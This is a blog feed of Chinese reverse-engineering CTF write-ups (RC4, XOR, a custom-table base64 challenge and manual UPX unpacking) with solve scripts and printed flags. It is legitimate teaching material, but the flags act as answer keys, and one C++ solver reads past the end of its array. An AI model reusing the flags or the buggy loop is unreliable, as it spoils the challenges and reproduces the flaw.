<span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">57</span>):</span><br><span class="line">                RC4(<span class="string">"2023"</span> + <span class="built_in">chr</span>(i) + <span class="built_in">chr</span>(j) + <span class="built_in">chr</span>(m) + <span class="built_in">chr</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="comment">#20230127</span></span><br></pre></td></tr></tbody></table></figure><p>然后交一下<code>20230127</code> 过啦</p><p>flag<code>flag{HitYourSoulAndSeeYoulnTheGalaxy}</code></p><p><img src="/2023/02/19/reverse-VNCTF2023WriteUp/image-20230219104225432.png" alt="image-20230219104225432"></p><p>好的  本题完成</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>这一题  还是很简单的   会RC4算法就好了</p><p>好的  本期结束  感谢观看</p><p>Orz</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reverse-[MRCTF2020]Xor</title>
      <link href="/2023/02/18/reverse-MRCTF2020-Xor/"/>
      <url>/2023/02/18/reverse-MRCTF2020-Xor/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="情景再现"><a href="#情景再现" class="headerlink" title="情景再现"></a>情景再现</h1><p>查壳</p><p><img src="/2023/02/18/reverse-MRCTF2020-Xor/image-20230218183007695.png" alt="image-20230218183007695"></p><p>然后运行一下程序</p><p>老规矩动调运行(能够顺便看下字符串 有无切入点)</p><p><img src="/2023/02/18/reverse-MRCTF2020-Xor/image-20230218183244297.png" alt="image-20230218183244297"></p><p><img src="/2023/02/18/reverse-MRCTF2020-Xor/image-20230218183104349.png" alt="image-20230218183104349"></p><p>拖入ida(一般打开后都会直接停在主函数出)</p><p>字符串跟踪  交叉引用找到主函数</p><p>发现无法反编译 看看 汇编</p><p><img src="/2023/02/18/reverse-MRCTF2020-Xor/image-20230218183608405.png" alt="image-20230218183608405"></p><p><img src="/2023/02/18/reverse-MRCTF2020-Xor/image-20230218183449495.png" alt="image-20230218183449495"></p><p>跟进401020 可以发现类似反调试的混淆</p><p>然后返回再次反编译  </p><p>啊？竟然可以了  (笔者太菜啦 不知道是因为什么造成的 )</p><p>有大佬知道原因  希望可以赐教Orz</p><p>修复一下代码  发现入题目一般 </p><p>就是一个简单的xor</p><p><img src="/2023/02/18/reverse-MRCTF2020-Xor/image-20230218183905760.png" alt="image-20230218183905760"></p><p>贴exp</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="type">int</span> c[] = {<span class="number">0X4D</span>,<span class="number">0X53</span>,<span class="number">0X41</span>,<span class="number">0X57</span>,<span class="number">0X42</span>,<span class="number">0X7E</span>,<span class="number">0X46</span>,<span class="number">0X58</span>,<span class="number">0X5A</span>,<span class="number">0X3A</span>,<span class="number">0X4A</span>,<span class="number">0X3A</span>,<span class="number">0X60</span>,<span class="number">0X74</span>,<span class="number">0X51</span>,<span class="number">0X4A</span>,<span class="number">0X22</span>,<span class="number">0X4E</span>,<span class="number">0X40</span>,<span class="number">0X20</span>,<span class="number">0X62</span>,<span class="number">0X70</span>,<span class="number">0X64</span>,<span class="number">0X64</span>,<span class="number">0X7D</span>,<span class="number">0X38</span>,<span class="number">0X67</span>};</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">33</span>;i++)cout &lt;&lt; (<span class="type">char</span>)(c[i]^i);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">encData =<span class="string">'MSAWB~FXZ:J:`tQJ"N@ bpdd}8g'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    flag +=<span class="built_in">chr</span>(<span class="built_in">ord</span>(encData[i]) ^ i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># MRCTF{@_R3@1ly_E2_R3verse!}</span></span><br></pre></td></tr></tbody></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这题超简单耶  </p><p>但有一个令人迷惑的操作</p><p>(虽然不0影响做题？有大佬知道，还请教教我)</p><p>好的， 本题结束</p><p>感谢观看 Orz</p></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>reverse-[ACTF新生赛2020]usualCrypt</title>
      <link href="/2023/02/18/reverse-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/"/>
      <url>/2023/02/18/reverse-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="情景再现"><a href="#情景再现" class="headerlink" title="情景再现"></a>情景再现</h1><p>查壳 </p><p><img src="/2023/02/18/reverse-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/image-20230218165645390.png" alt="image-20230218165645390"></p><p>运行程序  直接ollydbg 运行 顺便看下字符串 有无切入点</p><p>发现了类似base64的踪迹  但是好几个 应该有说法</p><p>以及  一串类似密文的东西</p><p><img src="/2023/02/18/reverse-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/image-20230218165808128.png" alt="image-20230218165808128"></p><p>笔者 动调了一会并没有发现非预期的解法(因为笔者是个大菜鸡)</p><p>其实完全没必要动调的  直接静态分析更容易理解</p><p>拖入ida静态分析</p><p>看过字符串了  所以直接跟踪主函数就好了</p><p><img src="/2023/02/18/reverse-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/image-20230218170319468.png" alt="image-20230218170319468"></p><p>跟进401080查看  发现经过了三个加密</p><p><img src="/2023/02/18/reverse-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/image-20230218170519312.png" alt="image-20230218170519312"></p><p>跟进第一个  很容易发现是换表操作</p><p><img src="/2023/02/18/reverse-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/image-20230218170630025.png" alt="image-20230218170630025"></p><p>新表exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">T1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">baseT = <span class="built_in">list</span>(T1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">15</span>):</span><br><span class="line">    baseT[i] = T1[i + <span class="number">10</span>]</span><br><span class="line">    baseT[i + <span class="number">10</span>] = T1[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">''</span>.join(baseT))</span><br><span class="line"><span class="comment"># ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/</span></span><br></pre></td></tr></tbody></table></figure><p>然后就是这一大坨base64了</p><p>base64 <strong>原理就是 3个8位字符   变4个6位字符</strong></p><p>贴一个容易理解的源码</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">/*base64.c*/  </span><br><span class="line"><span class="comment">#include "base64.h"  </span></span><br><span class="line">  </span><br><span class="line">unsigned char *base64_encode(unsigned char *<span class="built_in">str</span>)  </span><br><span class="line">{  </span><br><span class="line">    long <span class="built_in">len</span>;  </span><br><span class="line">    long str_len;  </span><br><span class="line">    unsigned char *res;  </span><br><span class="line">    <span class="built_in">int</span> i,j;  </span><br><span class="line">//定义base64编码表  </span><br><span class="line">    unsigned char *base64_table=<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;  </span><br><span class="line">  </span><br><span class="line">//计算经过base64编码后的字符串长度  </span><br><span class="line">    str_len=strlen(<span class="built_in">str</span>);  </span><br><span class="line">    <span class="keyword">if</span>(str_len % <span class="number">3</span> == <span class="number">0</span>)  </span><br><span class="line">        <span class="built_in">len</span>=str_len/<span class="number">3</span>*<span class="number">4</span>;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="built_in">len</span>=(str_len/<span class="number">3</span>+<span class="number">1</span>)*<span class="number">4</span>;  </span><br><span class="line">  </span><br><span class="line">    res=malloc(sizeof(unsigned char)*<span class="built_in">len</span>+<span class="number">1</span>);  </span><br><span class="line">    res[<span class="built_in">len</span>]=<span class="string">'\0'</span>;  </span><br><span class="line">  </span><br><span class="line">//以<span class="number">3</span>个<span class="number">8</span>位字符为一组进行编码  </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;<span class="built_in">len</span>-<span class="number">2</span>;j+=<span class="number">3</span>,i+=<span class="number">4</span>)  </span><br><span class="line">    {  </span><br><span class="line">        res[i]=base64_table[<span class="built_in">str</span>[j]&gt;&gt;<span class="number">2</span>]; //取出第一个字符的前<span class="number">6</span>位并找出对应的结果字符  </span><br><span class="line">        res[i+<span class="number">1</span>]=base64_table[(<span class="built_in">str</span>[j]&amp;<span class="number">0x3</span>)&lt;&lt;<span class="number">4</span> | (<span class="built_in">str</span>[j+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)]; //将第一个字符的后位与第二个字符的前<span class="number">4</span>位进行组合并找到对应的结果字符  </span><br><span class="line">        res[i+<span class="number">2</span>]=base64_table[(<span class="built_in">str</span>[j+<span class="number">1</span>]&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">2</span> | (<span class="built_in">str</span>[j+<span class="number">2</span>]&gt;&gt;<span class="number">6</span>)]; //将第二个字符的后<span class="number">4</span>位与第三个字符的前<span class="number">2</span>位组合并找出对应的结果字符  </span><br><span class="line">        res[i+<span class="number">3</span>]=base64_table[<span class="built_in">str</span>[j+<span class="number">2</span>]&amp;<span class="number">0x3f</span>]; //取出第三个字符的后<span class="number">6</span>位并找出结果字符  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">    switch(str_len % <span class="number">3</span>)  </span><br><span class="line">    {  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:  </span><br><span class="line">            res[i-<span class="number">2</span>]=<span class="string">'='</span>;  </span><br><span class="line">            res[i-<span class="number">1</span>]=<span class="string">'='</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:  </span><br><span class="line">            res[i-<span class="number">1</span>]=<span class="string">'='</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> res;  </span><br><span class="line">}  </span><br><span class="line">  </span><br><span class="line">unsigned char *base64_decode(unsigned char *code)  </span><br><span class="line">{  </span><br><span class="line">//根据base64表，以字符找到对应的十进制数据  </span><br><span class="line">    <span class="built_in">int</span> table[]={<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">62</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">63</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">54</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">57</span>,<span class="number">58</span>,</span><br><span class="line">     <span class="number">59</span>,<span class="number">60</span>,<span class="number">61</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,</span><br><span class="line">     <span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,</span><br><span class="line">     <span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">26</span>,</span><br><span class="line">     <span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,</span><br><span class="line">     <span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">39</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">44</span>,</span><br><span class="line">     <span class="number">45</span>,<span class="number">46</span>,<span class="number">47</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">51</span></span><br><span class="line">           };  </span><br><span class="line">    long <span class="built_in">len</span>;  </span><br><span class="line">    long str_len;  </span><br><span class="line">    unsigned char *res;  </span><br><span class="line">    <span class="built_in">int</span> i,j;  </span><br><span class="line">  </span><br><span class="line">//计算解码后的字符串长度  </span><br><span class="line">    <span class="built_in">len</span>=strlen(code);  </span><br><span class="line">//判断编码后的字符串后是否有=  </span><br><span class="line">    <span class="keyword">if</span>(strstr(code,<span class="string">"=="</span>))  </span><br><span class="line">        str_len=<span class="built_in">len</span>/<span class="number">4</span>*<span class="number">3</span>-<span class="number">2</span>;  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(strstr(code,<span class="string">"="</span>))  </span><br><span class="line">        str_len=<span class="built_in">len</span>/<span class="number">4</span>*<span class="number">3</span>-<span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        str_len=<span class="built_in">len</span>/<span class="number">4</span>*<span class="number">3</span>;  </span><br><span class="line">  </span><br><span class="line">    res=malloc(sizeof(unsigned char)*str_len+<span class="number">1</span>);  </span><br><span class="line">    res[str_len]=<span class="string">'\0'</span>;  </span><br><span class="line">  </span><br><span class="line">//以<span class="number">4</span>个字符为一位进行解码  </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">0</span>;i &lt; <span class="built_in">len</span>-<span class="number">2</span>;j+=<span class="number">3</span>,i+=<span class="number">4</span>)  </span><br><span class="line">    {  </span><br><span class="line">        res[j]=((unsigned char)table[code[i]])&lt;&lt;<span class="number">2</span> | (((unsigned char)table[code[i+<span class="number">1</span>]])&gt;&gt;<span class="number">4</span>); //取出第一个字符对应base64表的十进制数的前<span class="number">6</span>位与第二个字符对应base64表的十进制数的后<span class="number">2</span>位进行组合  </span><br><span class="line">        res[j+<span class="number">1</span>]=(((unsigned char)table[code[i+<span class="number">1</span>]])&lt;&lt;<span class="number">4</span>) | (((unsigned char)table[code[i+<span class="number">2</span>]])&gt;&gt;<span class="number">2</span>); //取出第二个字符对应base64表的十进制数的后<span class="number">4</span>位与第三个字符对应bas464表的十进制数的后<span class="number">4</span>位进行组合  </span><br><span class="line">        res[j+<span class="number">2</span>]=(((unsigned char)table[code[i+<span class="number">2</span>]])&lt;&lt;<span class="number">6</span>) | ((unsigned char)table[code[i+<span class="number">3</span>]]); //取出第三个字符对应base64表的十进制数的后<span class="number">2</span>位与第<span class="number">4</span>个字符进行组合  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> res;  </span><br><span class="line">  </span><br><span class="line">}  </span><br></pre></td></tr></tbody></table></figure><p>第三个加密  也很简单  是大小写转化</p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">encData = <span class="string">'zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encData.swapcase())</span><br><span class="line"><span class="comment">#ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9</span></span><br></pre></td></tr></tbody></table></figure><p>然后贴一个完整的exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">T1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">baseT = <span class="built_in">list</span>(T1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">15</span>):</span><br><span class="line">    baseT[i] = T1[i + <span class="number">10</span>]</span><br><span class="line">    baseT[i + <span class="number">10</span>] = T1[i]</span><br><span class="line">Str = <span class="string">''</span>.join(baseT)</span><br><span class="line"><span class="built_in">print</span>(Str)</span><br><span class="line"></span><br><span class="line">encData = <span class="string">'zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9'</span>.swapcase()</span><br><span class="line"><span class="built_in">print</span>(encData)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> encData:</span><br><span class="line">    flag += T1[Str.index(i)]</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><code>flag{bAse64_h2s_a_Surprise}</code></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题其实并不难</p><p>不过 笔者过于菜  花费了不少时间</p><p>原因应该是过于浮躁了</p><p>我真该死 Orz </p><p>Orz</p><p>最后 笔者想说的是  做逆向题一定要有耐心</p><p>仔细  不要浮躁  慢慢来  其实基本功扎实了  并没有什么难题</p><p>(当然， 笔者还是一个刚接触逆向的小白， 太多不会的了)</p><p>哈哈哈哈  </p><p>好的 本题结束  感谢观看  Orz</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reverse练习-手托带混淆的upx壳</title>
      <link href="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/"/>
      <url>/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="xiongtong-情景再现"><a href="#xiongtong-情景再现" class="headerlink" title="xiongtong-情景再现"></a>xiongtong-情景再现</h1><p>首先查壳  发现  没见过的东西（我没见过）</p><p>elf文件我了解的不多 （我是个菜鸡）</p><p>  大概是种混淆类的吧</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217121051246.png" alt="image-20230217121051246"></p><p>正常程序</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217153846216.png" alt="image-20230217153846216"></p><p>加壳的程序</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217153913978.png" alt="image-20230217153913978"></p><p>所以  可以发现没查出来壳  但实际是有壳的   </p><p>继续看下文也会发现  其实加了混淆</p><p>先运行文件看是个什么程序</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217121917660.png" alt="image-20230217121917660"></p><p>用ida64打开进行分析</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217121717457.png" alt="image-20230217121717457"></p><p>然后决定使用远程调试</p><p>小谈一下如何远程调试</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217121433912.png" alt="image-20230217121433912"></p><p>然后找到虚拟机的ip  指令<code>ip addr</code> (不行的话也可以<code>ifconfig -a</code>)</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217121625476.png" alt="image-20230217121625476"></p><p>然后这样  很简单的</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217122000002.png" alt="image-20230217122000002"></p><p>运行起来就是这种状况</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217122048766.png" alt="image-20230217122048766"></p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217122139462.png" alt="image-20230217122139462"></p><p>好的  回归正题</p><p>做题就是猜   感觉应该是种压缩壳</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217122225537.png" alt="image-20230217122225537"></p><p>《入口》在这 然后开始手动脱壳</p><p>大概就是一顿F8， 遇见回调 就CTRL N 跳到下一行指令处</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217122718838.png" alt="image-20230217122718838"></p><p>看到这几个字符串  好熟悉  对 就是i程序运行所看见的东西</p><p>主函数找到辣</p><p>然后推测  那个字符串就是密文</p><p>一直走到这  就会找到 真正的程序入口</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217123103122.png" alt="image-20230217123103122"></p><p>运行 试一试</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217123253501.png" alt="image-20230217123253501"></p><p>发现确实有切入点  跟踪密文字符串（双击跟踪）</p><p>发现找到了base表  并且是base64</p><p>那么接下来 就简单了</p><p>（如何提取？ 我做的时候是用sublime弄得  很快）</p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217123407869.png" alt="image-20230217123407869"></p><p>欧克   本题完成</p><p>flag     <code>gwjbdl{xintonggongsi}</code> </p><p><img src="/2023/02/17/reverse%E7%BB%83%E4%B9%A0-%E6%89%8B%E6%89%98%E5%B8%A6%E6%B7%B7%E6%B7%86%E7%9A%84upx%E5%A3%B3/image-20230217123601260.png" alt="image-20230217123601260"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题其实不难 （对我这种菜鸡来说还是挺难的）</p><p>就是看如何找到程序的主函数</p><p>然后  关键是看灵活性  做题思维要活跃嘛</p><p>最后 题目挺有意思 挺好玩的  哈哈哈   </p><p>好的  本题结束  感谢观看</p></body></html>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
